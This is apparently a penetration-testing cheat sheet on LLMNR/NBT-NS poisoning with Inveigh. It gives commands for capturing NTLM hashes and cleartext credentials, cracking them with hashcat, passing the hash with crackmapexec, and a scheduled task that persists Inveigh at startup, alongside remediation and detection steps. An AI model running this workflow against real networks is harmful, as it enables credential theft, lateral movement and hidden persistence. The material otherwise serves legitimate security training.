# LLMNR / NBT-NS Poisoning - from Windows

## 1. Inveigh Overview

* Windows-based tool for LLMNR and NBT-NS poisoning.
* Written in PowerShell and C#.
* Supports LLMNR, NBNS, DNS, mDNS, DHCPv6, ICMPv6, HTTP/HTTPS, SMB, LDAP, WebDAV, and Proxy Auth.
* PowerShell version is legacy; C# version (InveighZero) is maintained.

---

## 2. Using Inveigh (PowerShell)

### Import Module

```powershell
Import-Module .\Inveigh.ps1
```

### List Parameters

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

### Run Inveigh

```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Stop Inveigh

```powershell
Stop-Inveigh
```

---

## 3. Using Inveigh Zero (C#)

### Execute

```powershell
.\Inveigh.exe
```

### Console Interaction

* Press `ESC` for console.
* Use `HELP` for available commands.

## 4. Inveigh Console Commands

* `GET CONSOLE`
* `GET DHCPv6Leases`
* `GET LOG`
* `GET NTLMV1`
* `GET NTLMV2`
* `GET NTLMV1UNIQUE`
* `GET NTLMV2UNIQUE`
* `GET NTLMV1USERNAMES`
* `GET NTLMV2USERNAMES`
* `GET CLEARTEXT`
* `GET CLEARTEXTUNIQUE`
* `GET REPLYTODOMAINS`
* `GET REPLYTOHOSTS`
* `GET REPLYTOIPS`
* `GET REPLYTOMACS`
* `GET IGNOREDOMAINS`
* `GET IGNOREHOSTS`
* `GET IGNOREIPS`
* `GET IGNOREMACS`
* `SET CONSOLE`
* `HISTORY`
* `RESUME`
* `STOP`

---

## 5. Remediation

### Disable LLMNR

Group Policy:

```
Computer Configuration - Administrative Templates - Network - DNS Client - Turn Off Multicast Name Resolution
```

### Disable NBT-NS

```
Network Adapter - IPv4 - Advanced - WINS - Disable NetBIOS over TCP/IP
```

### PowerShell Script for GPO Deployment

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | ForEach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

Other mitigations:

* Enforce SMB signing.
* Network traffic filtering.
* IDS/IPS.
* Segmentation.

---

## 6. Detection

* Monitor UDP ports 5355 and 137.
* Track Event IDs 4697 and 7045.
* Registry check:

```
HKLM\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast
```

(0 = disabled)

* Sysmon monitoring.
* Honeypot non-existent hostnames.

---

## 7. Post-Capture Actions

### Hash Cracking

```powershell
hashcat -m 5600 captured_hashes.txt rockyou.txt --force
```

### Identify Hash Type

```powershell
hashid captured_hash.txt
```

### Lateral Movement

```powershell
crackmapexec smb <target-ip> -u <username> -H <hash>
```

### Password Spraying (if cracking fails)

---

## 8. Automation Example (Persistence)

```powershell
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File "C:\Tools\Inveigh.ps1"'
$Trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "InveighPersistence" -Description "Auto-start Inveigh"
```

---

## 9. Example Workflow

1. Start Inveigh and collect NTLMv2 hashes.
2. Crack hashes with Hashcat.
3. Test credentials using CrackMapExec.
4. Continue with privilege escalation or lateral movement.

---

## 10. Mitigation

* Disable LLMNR and NBT-NS.
* Enforce SMB signing.
* Monitor for poisoning attempts.
* Use segmentation and strict authentication policies.
